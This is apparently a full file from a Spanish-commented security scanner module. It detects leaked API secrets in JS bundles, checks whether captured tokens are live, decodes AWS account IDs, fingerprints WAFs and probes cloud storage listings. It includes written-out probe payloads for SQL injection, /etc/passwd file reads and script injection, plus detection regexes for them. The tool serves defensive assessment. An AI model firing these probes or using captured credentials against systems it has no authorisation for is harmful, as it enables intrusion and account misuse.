  { label: "Square OAuth Secret", re: /\bsq0csp-[0-9A-Za-z\-_]{43}\b/, cwe: "CWE-798", severity: "High" },
  { label: "Atlassian API Token", re: /\bATATT3xFfGF0[A-Za-z0-9_\-]{180,}\b/, cwe: "CWE-798", severity: "High" },
  { label: "Linear API Key", re: /\blin_api_[A-Za-z0-9]{40}\b/, cwe: "CWE-798", severity: "Medium" },
  { label: "New Relic License/API Key", re: /\b(?:NRAA|NRAK|NRBR)-[A-F0-9]{27}\b/, cwe: "CWE-798", severity: "Medium" },
  { label: "Datadog API Key", re: /dd[_-]?api[_-]?key['"\s:=]+([a-f0-9]{32})/i, cwe: "CWE-798", severity: "High" },
  { label: "Sentry DSN", re: /https:\/\/[a-f0-9]+@o[0-9]+\.ingest\.sentry\.io\/[0-9]+/, cwe: "CWE-798", severity: "Low" },
  { label: "Databricks PAT", re: /\bdapi[0-9a-f]{32}(?:-\d)?\b/, cwe: "CWE-798", severity: "High" },
  { label: "Grafana Cloud Token", re: /\bglc_[A-Za-z0-9+/]{32,}={0,2}\b/, cwe: "CWE-798", severity: "Medium" },
  { label: "Terraform Cloud Token", re: /\b[A-Za-z0-9]{14}\.atlasv1\.[A-Za-z0-9_\-=]{60,70}\b/, cwe: "CWE-798", severity: "Critical" },
  { label: "Fastly API Token", re: /fastly(.{0,20})?(api|token)['"\s:=]+([A-Za-z0-9_\-]{32})/i, cwe: "CWE-798", severity: "High" },
  { label: "Algolia Admin Key", re: /algolia(.{0,20})?(admin|api)[_-]?key['"\s:=]+([A-Za-z0-9]{32})/i, cwe: "CWE-798", severity: "High" },
  { label: "Airtable PAT", re: /\bpat[A-Za-z0-9]{14}\.[a-f0-9]{64}\b/, cwe: "CWE-798", severity: "High" },
  { label: "Airtable legacy API Key", re: /airtable(.{0,20})?(api)?[_-]?key['"\s:=]+(key[A-Za-z0-9]{14})/i, cwe: "CWE-798", severity: "Medium" },
  { label: "Azure/Entra client secret", re: /(?:azure|entra)[_-]?(?:client|app)[_-]?secret['"\s:=]+([A-Za-z0-9_~.\-]{34,40})/i, cwe: "CWE-798", severity: "High" },
  { label: "Facebook Access Token", re: /\bEAA[A-Za-z0-9]{90,}\b/, cwe: "CWE-798", severity: "High" },
  { label: "JFrog/Artifactory API Key", re: /\bAKCp[A-Za-z0-9]{50,70}\b/, cwe: "CWE-798", severity: "High" },
  { label: "Okta SSWS Token", re: /\bSSWS\s+[0-9a-zA-Z_\-]{40}\b/, cwe: "CWE-798", severity: "Critical" },
  { label: "Okta API Token", re: /okta(.{0,20})?(api)?[_-]?token['"\s:=]+([0-9a-zA-Z_\-]{40})/i, cwe: "CWE-798", severity: "High" },
  { label: "Doppler Service Token", re: /\bdp\.pt\.[A-Za-z0-9]{40,44}\b/, cwe: "CWE-798", severity: "Critical" },
  { label: "HashiCorp Vault Token", re: /\bhvs\.[A-Za-z0-9_\-]{90,100}\b/, cwe: "CWE-798", severity: "Critical" },
  { label: "PagerDuty API Key", re: /pagerduty(.{0,20})?(api|token|key)['"\s:=]+([A-Za-z0-9+_\-]{20,32})/i, cwe: "CWE-798", severity: "Medium" },
  { label: "Asana PAT", re: /asana(.{0,20})?(token|pat)['"\s:=]+([0-9]{1,10}\/[0-9]{10,20}:[a-f0-9]{32})/i, cwe: "CWE-798", severity: "Medium" },
];

const JS_SECRET_PLACEHOLDER_RE = /^(x+|0+|1+|dummy|example|test|changeme|xxxx+|yyyy+|your[-_]?\w*|placeholder|undefined|null|redacted|\*+)$/i;

/**
 * Escanea el cuerpo de un bundle JS ya descargado por patrones de secretos
 * de proveedores conocidos (formato específico, bajo falso-positivo) y,
 * de forma más ruidosa, por asignaciones genéricas api_key/secret/token
 * con valor largo no-placeholder (a confirmar manualmente).
 */
export function jsSecretFindings(jsText, path) {
  const text = String(jsText || "");
  const out = [];
  for (const sig of JS_SECRET_SIGNATURES) {
    const m = text.match(sig.re);
    if (!m) continue;
    out.push({
      title: `${sig.label} hardcodeada en bundle JS (${path})`,
      severity: sig.severity || "Critical",
      description: `El bundle JavaScript servido en ${path} contiene un valor con el formato de ${sig.label} (empieza «${m[0].slice(0, 10)}…») embebido en texto plano (${sig.cwe}): cualquiera que descargue el bundle público obtiene la credencial. Es un error habitual en SPAs que ponen claves de backend/servicios en el código cliente.`,
      remediation: "Retirar la clave del bundle cliente; moverla a un backend/proxy que la use server-side; rotar la credencial expuesta de inmediato (puede llevar tiempo cacheada en CDN/buscadores).",
    });
  }
  const genericRe = /(api[_-]?key|secret|access[_-]?token|auth[_-]?token)\s*[:=]\s*["']([A-Za-z0-9_\-]{16,})["']/gi;
  let gm;
  let genericCount = 0;
  while ((gm = genericRe.exec(text)) && genericCount < 3) {
    const val = gm[2];
    if (JS_SECRET_PLACEHOLDER_RE.test(val)) continue;
    genericCount++;
    out.push({
      title: `Posible secreto hardcodeado en bundle JS (${path}): ${gm[1]}`,
      severity: "Medium",
      description: `Se encontró la asignación «${gm[1]}: ${val.slice(0, 6)}…» en el bundle JavaScript servido en ${path} (CWE-798). El formato no corresponde a un proveedor conocido, así que hay que confirmar a mano si es una credencial real o una clave intencionadamente pública (p. ej. Stripe publishable key, Firebase apiKey de Web).`,
      remediation: "Confirmar si el valor es sensible; si lo es, moverlo a backend y rotarlo. Si es una clave pública legítima, documentar que es intencional.",
    });
  }
  return out;
}

const JS_CODE_DANGER_SIGNATURES = [
  {
    kind: "sqli_concat",
    label: "SQL armado por concatenación de string",
    cwe: "CWE-89",
    severity: "Critical",
    // Captures the request-param name used inside a raw/whereRaw-style
    // string concatenation, e.g. whereRaw("code = '" . $request->code . "'").
    re: /where[rR]aw\([\s\S]*?\.\s*\$?request(?:->|\.)(\w+)/,
  },
  {
    kind: "lfi_include",
    label: "Lectura de fichero desde entrada de usuario sin sanitizar",
    cwe: "CWE-98",
    severity: "Critical",
    re: /(?:file_get_contents|include|require)\s*\(\s*\$_(?:GET|REQUEST|POST)\[['"](\w+)['"]\]/,
  },
  {
    kind: "xss_unescaped_echo",
    label: "Salida de parámetro sin escapar (echo/print directo)",
    cwe: "CWE-79",
    severity: "High",
    re: /(?:echo|print)\s+\$_(?:GET|REQUEST|POST)\[['"](\w+)['"]\]/,
  },
  {
    kind: "authz_missing_middleware",
    label: "Ruta administrativa sin middleware de autenticación visible",
    cwe: "CWE-862",
    severity: "High",
    re: /Route::\w+\(\s*['"](\/(?:admin|internal|staff)[^'"]*)['"]\s*,[^)]*\)(?!\s*->\s*middleware)/,
  },
];

/**
 * Escanea contenido fuente/config ya filtrado por el propio catálogo
 * (.env, .git/config, source maps, backups — ver env-file/git-head/etc.
 * en este mismo archivo) buscando patrones de código peligrosos por
 * clase de vulnerabilidad, y devuelve hasta 5 hits con el parámetro/ruta
 * exacto encontrado para poder construir una sonda dirigida (no genérica).
 */
export function extractDangerousCodePatterns(blob) {
  const text = String(blob || "");
  const hits = [];
  for (const sig of JS_CODE_DANGER_SIGNATURES) {
    const m = text.match(sig.re);
    if (!m) continue;
    const captured = m[1] || null;
    hits.push({
      kind: sig.kind,
      label: sig.label,
      cwe: sig.cwe,
      severity: sig.severity,
      snippet: m[0].slice(0, 200),
      param: sig.kind === "authz_missing_middleware" ? null : captured,
      route: sig.kind === "authz_missing_middleware" ? captured : null,
    });
    if (hits.length >= 5) break;
  }
  return hits;
}

const CODE_DANGER_PROBE_BUILDERS = {
  sqli_concat: (hit, baseUrl) => ["-s", "-L", "--max-time", "15", "-G", baseUrl,
    "--data-urlencode", `${hit.param}=x' OR '1'='1`],
  lfi_include: (hit, baseUrl) => ["-s", "-L", "--max-time", "15", "-G", baseUrl,
    "--data-urlencode", `${hit.param}=file:///etc/passwd`],
  xss_unescaped_echo: (hit, baseUrl) => ["-s", "-L", "--max-time", "15", "-G", baseUrl,
    "--data-urlencode", `${hit.param}=<script>alert(1)</script>`],
  authz_missing_middleware: (hit, baseUrl) => {
    const url = new URL(hit.route, baseUrl || "http://localhost").toString();
    return ["-s", "-L", "--max-time", "15", "-w", "\nDS_HTTP:%{http_code}\n", url];
  },
};

/**
 * Sondas dirigidas por hallazgo de código peligroso (mirror de
 * secretValidateCurlSteps): un hit trae ya el parámetro o ruta exactos,
 * así que la sonda ataca ese punto en vez de repetir el catálogo genérico.
 */
export function codeDangerProbeSteps(step, hits, baseUrl = "") {
  const list = Array.isArray(hits) ? hits.slice(0, 3) : [];
  return list.map((hit, i) => {
    const builder = CODE_DANGER_PROBE_BUILDERS[hit.kind];
    if (!builder) return null;
    return step(`p2-codeguided-${i + 1}`, "curl", builder(hit, baseUrl), null, {
      desc: `Sonda dirigida por código fuente filtrado: ${hit.label} (${hit.kind})`,
      codeDangerKind: hit.kind,
      codeDangerCwe: hit.cwe,
      codeDangerSeverity: hit.severity,
    });
  }).filter(Boolean);
}

const CODE_DANGER_CONFIRM_RE = {
  // Errores de motor SQL en el cuerpo: la comilla del payload rompió la
  // consulta y el servidor filtró el error en vez de manejarlo — evidencia
  // de que el input llega crudo al motor, no solo "la app respondió 200".
  sqli_concat: /SQL syntax|mysql_fetch|You have an error in your SQL|ORA-\d{5}|SQLSTATE\[|PostgreSQL.*ERROR|SQLite3::|Unclosed quotation mark|syntax error at or near/i,
  // Firma clásica de /etc/passwd (línea de root) — no un simple 200, el
  // cuerpo tiene que contener contenido real del fichero del sistema.
  lfi_include: /root:.*:0:0:/,
  // El payload tiene que aparecer SIN escapar en el cuerpo — si el filtro
  // lo convirtió a &lt;script&gt; no hay XSS real, solo un eco seguro.
  xss_unescaped_echo: /<script>alert\(1\)<\/script>/,
};

/**
 * Confirma (o descarta) cada hit de codeDangerProbeSteps contra la
 * respuesta real de su sonda dirigida — mismo principio que el resto del
 * motor: la sonda propone, la evidencia de la respuesta confirma. No basta
 * con "el código parecía peligroso"; hace falta ver el efecto en el cuerpo.
 */
export function codeDangerFinding(probeText, hit) {
  const text = String(probeText || "");
  if (hit.kind === "authz_missing_middleware") {
    const code = parseDsHttp(text);
    if (code !== "200") return [];
    return [{
      title: `Ruta administrativa accesible sin autenticación (${hit.route})`,
      severity: hit.severity,
      description: `El código fuente filtrado define la ruta ${hit.route} sin middleware de autenticación visible en su declaración. Se confirmó con una petición GET anónima: el servidor respondió HTTP 200 en vez de redirigir a login o devolver 401/403 (${hit.cwe}).`,
      remediation: "Aplicar el middleware de autenticación/autorización correspondiente a esta ruta; añadir un test de regresión que falle si vuelve a quedar accesible sin sesión.",
    }];
  }
  const confirmRe = CODE_DANGER_CONFIRM_RE[hit.kind];
  if (!confirmRe || !confirmRe.test(text)) return [];
  const titleByKind = {
    sqli_concat: `Inyección SQL confirmada en parámetro «${hit.param}» (código fuente filtrado)`,
    lfi_include: `Lectura de fichero arbitrario confirmada en parámetro «${hit.param}» (código fuente filtrado)`,
    xss_unescaped_echo: `XSS reflejado confirmado en parámetro «${hit.param}» (código fuente filtrado)`,
  };
  const descByKind = {
    sqli_concat: `El código fuente filtrado concatena directamente el parámetro «${hit.param}» dentro de una consulta SQL sin binding. Una comilla simple en ese parámetro rompió la consulta y el motor de base de datos filtró su error en la respuesta — confirma que el input llega crudo al SQL (${hit.cwe}).`,
    lfi_include: `El código fuente filtrado pasa el parámetro «${hit.param}» directamente a una función de lectura de fichero sin sanitizar. Al pedir «file:///etc/passwd» en ese parámetro, la respuesta contiene contenido real del fichero de sistema (${hit.cwe}).`,
    xss_unescaped_echo: `El código fuente filtrado hace echo directo del parámetro «${hit.param}» sin escapar. El payload de prueba (<script>alert(1)</script>) volvió sin codificar en el cuerpo de la respuesta (${hit.cwe}).`,
  };
  return [{
    title: titleByKind[hit.kind],
    severity: hit.severity,
    description: descByKind[hit.kind],
    remediation: "Reescribir el punto exacto identificado en el código filtrado: consultas parametrizadas para SQL, allow-list de esquema/ruta para lecturas de fichero, escapado contextual para salida reflejada. Priorizar por ser una vulnerabilidad confirmada, no solo sospechada.",
  }];
}

export function jsSecretSignatureCount() {
  return JS_SECRET_SIGNATURES.length;
}

function secretMatchToken(m) {
  if (!m) return "";
  for (let i = m.length - 1; i >= 1; i -= 1) {
    if (m[i] && String(m[i]).length >= 8) return String(m[i]);
  }
  return String(m[0] || "");
}

/**
 * Extrae tokens con validador read-only conocido del blob acumulado
 * (bundles JS, HTML, etc.). Tope 5: cada uno dispara un GET de identidad.
 */
export function extractCapturedSecrets(blob) {
  const text = String(blob || "");
  const hits = [];
  const seen = new Set();
  for (const sig of JS_SECRET_SIGNATURES) {
    if (!sig.validator) continue;
    const flags = sig.re.flags.includes("g") ? sig.re.flags : `${sig.re.flags}g`;
    const re = new RegExp(sig.re.source, flags);
    let m;
    while ((m = re.exec(text))) {
      const token = secretMatchToken(m).slice(0, 240);
      if (!token || JS_SECRET_PLACEHOLDER_RE.test(token)) continue;
      const key = `${sig.validator}:${token.slice(0, 28)}`;
      if (seen.has(key)) continue;
      seen.add(key);
      hits.push({ kind: sig.validator, token, label: sig.label });
      if (hits.length >= 5) return hits;
    }
  }
  return hits;
}

/**
 * 9 validadores read-only (identidad GET, nunca escritura ni webhook POST).
 * AWS STS GetCallerIdentity se omite a propósito: exige SigV4; el account ID
 * se decodifica offline desde AKIA/ASIA (accountIdFromAccessKey).
 */
const SECRET_VALIDATORS = {
  github: (token) => ["-s", "-L", "--max-time", "10", "-w", "\nDS_HTTP:%{http_code}\n",
    "-H", `Authorization: Bearer ${token}`, "-H", "User-Agent: DarkSpear-OSINT",
    "https://api.github.com/user"],
  gitlab: (token) => ["-s", "-L", "--max-time", "10", "-w", "\nDS_HTTP:%{http_code}\n",
    "-H", `PRIVATE-TOKEN: ${token}`,
    "https://gitlab.com/api/v4/user"],
  slack: (token) => ["-s", "-L", "--max-time", "10", "-w", "\nDS_HTTP:%{http_code}\n",
    "-H", `Authorization: Bearer ${token}`,
    "https://slack.com/api/auth.test"],
  stripe: (token) => ["-s", "-L", "--max-time", "10", "-w", "\nDS_HTTP:%{http_code}\n",
    "-u", `${token}:`,
    "https://api.stripe.com/v1/balance"],
  sendgrid: (token) => ["-s", "-L", "--max-time", "10", "-w", "\nDS_HTTP:%{http_code}\n",
    "-H", `Authorization: Bearer ${token}`,
    "https://api.sendgrid.com/v3/scopes"],
  npm: (token) => ["-s", "-L", "--max-time", "10", "-w", "\nDS_HTTP:%{http_code}\n",
    "-H", `Authorization: Bearer ${token}`,
    "https://registry.npmjs.org/-/whoami"],
  digitalocean: (token) => ["-s", "-L", "--max-time", "10", "-w", "\nDS_HTTP:%{http_code}\n",
    "-H", `Authorization: Bearer ${token}`,
    "https://api.digitalocean.com/v2/account"],
  huggingface: (token) => ["-s", "-L", "--max-time", "10", "-w", "\nDS_HTTP:%{http_code}\n",
    "-H", `Authorization: Bearer ${token}`,
    "https://huggingface.co/api/whoami-v2"],
  square: (token) => ["-s", "-L", "--max-time", "10", "-w", "\nDS_HTTP:%{http_code}\n",
    "-H", `Authorization: Bearer ${token}`, "-H", "Square-Version: 2024-01-18",
    "https://connect.squareup.com/v2/locations"],
};

export function secretValidateCurlSteps(step, secrets) {
  const list = Array.isArray(secrets) ? secrets.slice(0, 5) : [];
  return list.map((hit, i) => {
    const builder = SECRET_VALIDATORS[hit.kind];
    if (!builder) return null;
    return step(`p1-secretval-${i + 1}`, "curl", builder(hit.token), null, {
      desc: `Validador read-only: ¿sigue viva la credencial ${hit.label}?`,
      secretKind: hit.kind,
      secretLabel: hit.label,
    });
  }).filter(Boolean);
}

function parseDsHttp(text) {
  const m = String(text || "").match(/DS_HTTP:(\d{3})/);
  return m ? m[1] : "";
}

const SECRET_LIVE_BODY = {
  github: /"login"\s*:/,
  gitlab: /"username"\s*:/,
  slack: /"ok"\s*:\s*true/,
  stripe: /"object"\s*:\s*"balance"|"available"\s*:/,
  sendgrid: /"scopes"\s*:/,
  npm: /"username"\s*:/,
  digitalocean: /"account"\s*:/,
  huggingface: /"name"\s*:|"fullname"\s*:/,
  square: /"locations"\s*:/,
};

export function secretValidateFindings(probeText, kind, label) {
  const text = String(probeText || "");
  const code = parseDsHttp(text);
  const name = label || kind || "credencial";
  if (code === "401" || code === "403") {
    return [{
      title: `Credencial ${name} presente en el activo pero revocada o inválida`,
      severity: "Medium",
      description: `El validador read-only (${kind}) respondió HTTP ${code}: el formato coincide con una credencial real pero el proveedor ya no la acepta. Sigue siendo un secreto que no debería estar en código cliente (puede reactivarse, o filtrar el prefijo/cuenta).`,
      remediation: "Retirar el valor del bundle aunque esté revocado; rotar por si acaso; añadir scanner de secretos al CI.",
    }];
  }
  if (code !== "200") return [];
  const liveRe = SECRET_LIVE_BODY[kind];
  if (liveRe && !liveRe.test(text)) return [];
  return [{
    title: `Credencial ${name} viva confirmada (validador read-only)`,
    severity: "Critical",
    description: `Una petición GET de identidad al API del proveedor (${kind}) con la credencial hallada en el bundle devolvió HTTP 200 y un cuerpo de cuenta/identidad. No se ha usado la credencial para escribir, listar recursos ajenos ni enviar mensajes: solo se confirmó que sigue activa. Quien tenga el bundle público tiene acceso vivo al servicio.`,
    remediation: "Revocar/rotar de inmediato en el panel del proveedor; auditar logs de uso no autorizado; sacar el secreto del cliente (BFF).",
  }];
}

/* ------------------------------------------------------------------------ *
 * Identidad cloud (AWS account ID offline desde AKIA/ASIA, ARNs en el
 * cuerpo ya descargado). Cero tráfico extra. Los buckets listables ya se
 * tratan como observed (referenciados por la propia app) — ownership
 * verificado; no se permutan nombres genéricos (evita el flood de FP).
 * ------------------------------------------------------------------------ */
const AWS_KEY_PREFIXES = new Set([
  "AKIA", "ASIA", "AROA", "AIDA", "AGPA", "AIPA", "ANPA", "ANVA", "ABIA", "ACCA",
]);
const AWS_EXAMPLE_ACCOUNT_IDS = new Set([
  "123456789012", "111122223333", "222233334444", "333344445555",
  "444455556666", "555566667777", "666677778888", "777788889999",
  "888899990000", "999900001111", "012345678901", "000000000000",
  "123412341234", "101010101010",
]);
export const AWS_ARN_RE = /arn:aws:[a-z0-9-]+:[a-z0-9-]*:(\d{12}):[^\s"'<>\\]+/gi;
export const AZURE_TENANT_GUID_RE = /login\.microsoftonline\.com\/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})/i;
export const GCP_PROJECT_RE = /"project_id"\s*:\s*"([a-z][a-z0-9-]{4,28}[a-z0-9])"/i;

function b32decodeBytes(s) {
  const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
  let bits = 0;
  let value = 0;
  const bytes = [];
  const str = String(s || "").toUpperCase().replace(/=+$/, "");
  for (let i = 0; i < str.length; i += 1) {
    const idx = alphabet.indexOf(str[i]);
    if (idx < 0) return null;
    value = (value << 5) | idx;
    bits += 5;
    if (bits >= 8) {
      bits -= 8;
      bytes.push((value >>> bits) & 0xff);
    }
  }
  return bytes;
}

/** Test vector: ASIAY34FZKBOKMUTVV7A → 609629065308 (Steele/Tenable). */
export function accountIdFromAccessKey(key) {
  const k = String(key || "").trim().toUpperCase().slice(0, 20);
  if (k.length !== 20 || !AWS_KEY_PREFIXES.has(k.slice(0, 4))) return null;
  const body = k.slice(4);
  if (!/^[A-Z2-7]{16}$/.test(body)) return null;
  const decoded = b32decodeBytes(body);
  if (!decoded || decoded.length < 6) return null;
  let z = 0n;
  for (let i = 0; i < 6; i += 1) z = (z << 8n) | BigInt(decoded[i]);
  const account = Number((z & 0x7FFFFFFFFF80n) >> 7n);
  if (!Number.isFinite(account) || account > 999999999999) return null;
  return String(account).padStart(12, "0");
}

export function cloudIdentityFindings(blob) {
  const text = String(blob || "");
  const out = [];
  const seenAcct = new Set();
  const keyRe = /\b((?:AKIA|ASIA)[A-Z0-9]{16})\b/g;
  let km;
  while ((km = keyRe.exec(text))) {
    const acct = accountIdFromAccessKey(km[1]);
    if (!acct || AWS_EXAMPLE_ACCOUNT_IDS.has(acct) || seenAcct.has(acct)) continue;
    seenAcct.add(acct);
    out.push({
      title: `AWS Access Key ID decodifica a account ${acct}`,
      severity: "Info",
      description: `El Access Key ID ${km[1].slice(0, 8)}… (prefijo ${km[1].slice(0, 4)}) decodifica offline al AWS account ID ${acct} (algoritmo público Steele/Tenable, sin llamar a STS). Contexto de superficie cloud: confirma la cuenta AWS vinculada al secreto hallado. No se ha invocado GetCallerIdentity.`,
      remediation: `Ninguna por el ID en sí. Si la clave está viva, rotarla y revisar IAM de esa cuenta. Confirmar con el cliente que ${acct} es suya y no de un tercero/ejemplo.`,
    });
  }
  const arnRe = new RegExp(AWS_ARN_RE.source, "gi");
  let am;
  const seenArn = new Set();
  while ((am = arnRe.exec(text))) {
    const acct = am[1];
    if (AWS_EXAMPLE_ACCOUNT_IDS.has(acct) || seenArn.has(acct)) continue;
    seenArn.add(acct);
    out.push({
      title: `ARN AWS en el activo referencia account ${acct}`,
      severity: "Info",
      description: `El cuerpo público contiene un ARN (${String(am[0]).slice(0, 48)}…) con account ID ${acct}. Identidad cloud observada en el propio activo (ownership: observed), no adivinada por permutación.`,
      remediation: "Confirmar con el cliente que la cuenta es propia. Inventariar el recurso ARN y aplicar mínimo privilegio.",
    });
  }
  const az = text.match(AZURE_TENANT_GUID_RE);
  if (az) {
    out.push({
      title: `Tenant Azure/Entra ID ${az[1]} referenciado por la app`,
      severity: "Info",
      description: `Una URL pública apunta a login.microsoftonline.com/${az[1]}: el GUID de tenant Entra queda expuesto. Discovery pasivo; no se enumeran usuarios.`,
      remediation: "Ninguna: el tenant GUID no es secreto. Documentar en inventario de IdP.",
    });
  }
  const gcp = text.match(GCP_PROJECT_RE);
  if (gcp) {
    out.push({
      title: `Proyecto GCP "${gcp[1]}" referenciado por la app`,
      severity: "Info",
      description: `El cuerpo público nombra el proyecto GCP «${gcp[1]}». Identidad cloud observada (ownership: observed).`,
      remediation: "Confirmar que el proyecto es del cliente; revisar IAM y APIs habilitadas.",
    });
  }
  return out;
}

/* ------------------------------------------------------------------------ *
 * Fingerprint de WAF/CDN (pasivo, solo cabeceras ya obtenidas) — misma
 * lógica que wafw00f: firmas conocidas en headers/cookies de la raíz.
 * https://hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html
 * ------------------------------------------------------------------------ */
const WAF_SIGNATURES = [
  { name: "Cloudflare", re: /cf-ray\s*:|server:\s*cloudflare|__cf_bm=|cf-mitigated\s*:/i },
  { name: "AWS CloudFront/WAF", re: /x-amz-cf-id\s*:|via:.*cloudfront|x-amzn-waf-|x-amzn-errortype:\s*waf/i },
  { name: "Akamai", re: /server:\s*akamaighost|x-akamai|akamai-ghost/i },
  { name: "Imperva/Incapsula", re: /x-iinfo\s*:|incap_ses_|visid_incap_/i },
  { name: "Sucuri", re: /x-sucuri-id\s*:|server:\s*sucuri/i },
  { name: "F5 BIG-IP ASM", re: /x-wa-info\s*:|bigipserver|ts[0-9a-f]{8}=/i },
  { name: "Azure Front Door", re: /x-azure-ref\s*:|x-fd-healthprobe/i },
  { name: "Fastly", re: /via:.*fastly|x-served-by:\s*cache-/i },
  { name: "ModSecurity", re: /mod_security|modsecurity|server:\s*modsec/i },
  { name: "FortiWeb/FortiGate", re: /fortiweb|fortigate|fgd_icon/i },
  { name: "Barracuda", re: /barra_counter_session|barracuda/i },
  { name: "Wordfence", re: /wordfence|wfwaf/i },
];

export function wafFindings(headText) {
  const h = String(headText || "");
  if (!h.trim()) return [];
  for (const sig of WAF_SIGNATURES) {
    if (sig.re.test(h)) {
      return [{
        title: `WAF/CDN identificado: ${sig.name}`,
        severity: "Info",
        description: `Las cabeceras de respuesta identifican ${sig.name} delante de la aplicación (huella pasiva, sin payload de prueba). Esto no es una vulnerabilidad: es contexto de gobierno — explica por qué ciertas sondas activas pueden llegar bloqueadas/alteradas y documenta que hay una capa de defensa perimetral.`,
        remediation: "Ninguna: es información de contexto. Si se esperaba WAF y no aparece ninguna firma, valorar añadir uno.",
      }];
    }
  }
  return [];
}

/* ------------------------------------------------------------------------ *
 * Fingerprint de proveedor cloud (AWS) — pasivo, cabeceras de CloudFront /
 * API Gateway / ALB. Igual que WAF: contexto de gobierno, no vulnerabilidad
 * por sí solo.
 * ------------------------------------------------------------------------ */
export function cloudProviderFindings(headText) {
  const h = String(headText || "");
  if (!h.trim()) return [];
  if (/x-amz-cf-id\s*:|x-amzn-requestid\s*:|x-amzn-trace-id\s*:|x-amz-apigw-id\s*:/i.test(h)) {
    return [{
      title: "Infraestructura identificada como AWS (CloudFront/API Gateway/ALB)",
      severity: "Info",
      description: "Las cabeceras de respuesta (x-amz-cf-id, x-amzn-requestid, x-amz-apigw-id, etc.) identifican infraestructura AWS delante de la aplicación. Contexto de gobierno: si hay hallazgos de credenciales expuestas, revisar también IAM/S3/metadata de instancia como superficie relacionada.",
      remediation: "Ninguna: es información de contexto para priorizar la revisión de configuración cloud (IAM, S3, Security Groups).",
    }];
  }
  return [];
}

/* ------------------------------------------------------------------------ *
 * Bucket S3 público — si algún recurso ya descargado (HTML/JS) referencia
 * un bucket S3, se comprueba con un GET de solo lectura si el listado es
 * público (autoindex de S3), igual de pasivo que comprobar un directorio
 * listable en el propio servidor.
 * ------------------------------------------------------------------------ */
export const S3_BUCKET_HOST_RE = /([a-z0-9][a-z0-9.\-]{1,61}[a-z0-9])\.s3[.\-][a-z0-9\-]*\.amazonaws\.com/i;

export function extractS3BucketHost(rawBlob) {
  const m = String(rawBlob || "").match(S3_BUCKET_HOST_RE);
  return m ? m[0] : null;
}

export function s3BucketCheckStep(step, bucketHost, maxTime = "12") {
  if (!bucketHost) return [];
  return [
    step("p1-s3-bucket-check", "curl", [
      "-s", "-L", "--max-time", maxTime, `https://${bucketHost}/`,
    ], null, {
      desc: `Bucket S3 referenciado por la app: ¿listado público? (${bucketHost})`,
    }),
  ];
}

export const S3_LISTING_RE = /<ListBucketResult/i;

/* ------------------------------------------------------------------------ *
 * Bucket Azure Blob / GCS público — mismo patrón pasivo que S3: si algún
 * recurso ya descargado referencia un contenedor de otro proveedor cloud,
 * se comprueba con un GET de solo lectura si el listado es público.
 * ------------------------------------------------------------------------ */
export const AZURE_BLOB_HOST_RE = /([a-z0-9]{3,24})\.blob\.core\.windows\.net(?:\/([a-z0-9][a-z0-9-]{1,61}[a-z0-9]))?/i;
export const GCS_BUCKET_HOST_RE = /storage\.googleapis\.com\/([a-z0-9][a-z0-9_.\-]{1,220}[a-z0-9])/i;

export function extractAzureBlobContainer(rawBlob) {
  const m = String(rawBlob || "").match(AZURE_BLOB_HOST_RE);
  if (!m) return null;
  return { account: m[1], container: m[2] || null, matched: m[0] };
}

export function extractGcsBucket(rawBlob) {
  const m = String(rawBlob || "").match(GCS_BUCKET_HOST_RE);
  return m ? m[1] : null;
}

export function azureBlobCheckStep(step, blobRef, maxTime = "12") {
  if (!blobRef || !blobRef.container) return [];
  return [
    step("p1-azureblob-check", "curl", [
      "-s", "-L", "--max-time", maxTime,
      `https://${blobRef.account}.blob.core.windows.net/${blobRef.container}?restype=container&comp=list`,
    ], null, {
      desc: `Contenedor Azure Blob referenciado por la app: ¿listado público? (${blobRef.account}/${blobRef.container})`,
    }),
  ];
}

export function gcsBucketCheckStep(step, bucketName, maxTime = "12") {
  if (!bucketName) return [];
  return [
    step("p1-gcs-bucket-check", "curl", [
      "-s", "-L", "--max-time", maxTime,
      `https://storage.googleapis.com/storage/v1/b/${bucketName}/o`,
    ], null, {
      desc: `Bucket GCS referenciado por la app: ¿listado público? (${bucketName})`,
    }),
  ];
}

export const AZURE_BLOB_LISTING_RE = /<EnumerationResults/i;
export const GCS_LISTING_RE = /"kind":\s*"storage#objects"/i;

/* ------------------------------------------------------------------------ *
 * cloud_enum (github.com/initstring/cloud_enum) — enumeración ACTIVA por
 * permutación de nombre contra AWS/Azure/GCP, a diferencia de
 * extractS3BucketHost/extractAzureBlobContainer/extractGcsBucket (arriba),
 * que son PASIVAS: solo confirman un recurso que la app YA referencia.
 * Esto adivina nombres a partir del dominio del cliente.
 *
 * Problema de atribución inherente a la técnica: un bucket "acme" puede
 * pertenecer a CUALQUIER empresa que se llame así, no necesariamente al
 * cliente auditado — a diferencia de subdomain takeover (ancla a un host
 * que sí resuelve bajo el dominio real). Por eso ningún finding de acá
 * pasa de Medium: siempre es candidato a confirmar propiedad a mano.
 * ------------------------------------------------------------------------ */

/** Segundo-a-último label del dominio (nombre de marca, no el TLD ni un subdominio). */
export function cloudEnumKeyword(root) {
  const labels = String(root || "").toLowerCase().split(".").filter(Boolean);
  if (!labels.length) return "";
  return labels.length >= 2 ? labels[labels.length - 2] : labels[0];
}

export function cloudEnumArgs(keyword) {
  return ["-k", keyword, "-qs", "-l", "/dev/stdout", "-f", "json"];
}

// Recursos con datos reales detrás (no solo un DNS/app registrado).
const CLOUD_ENUM_STORAGE_RE = /bucket|container|storage|database|blob/i;
// cloud_enum marca "Open X" cuando confirma listado/lectura sin auth.
const CLOUD_ENUM_OPEN_RE = /^open\b/i;

export function cloudEnumFindings(stdout) {
  const lines = String(stdout || "").split("\n").map((l) => l.trim()).filter(Boolean);
  const out = [];
  const seen = new Set();
  for (const line of lines) {
    if (!line.startsWith("{")) continue;
    let hit;
    try {
      hit = JSON.parse(line);
    } catch {
      continue;
    }
    if (!hit.target || hit.access === "disabled" || !hit.access) continue;
    if (seen.has(hit.target)) continue;
    seen.add(hit.target);
    const platform = String(hit.platform || "cloud").toUpperCase();
    const isStorage = CLOUD_ENUM_STORAGE_RE.test(hit.msg || "");
    const isOpen = hit.access === "public" && (CLOUD_ENUM_OPEN_RE.test(hit.msg || "") || isStorage);
    if (isOpen) {
      out.push({
        title: `${platform}: recurso cloud público sin autenticación (candidato — confirmar pertenencia)`,
        severity: "Medium",
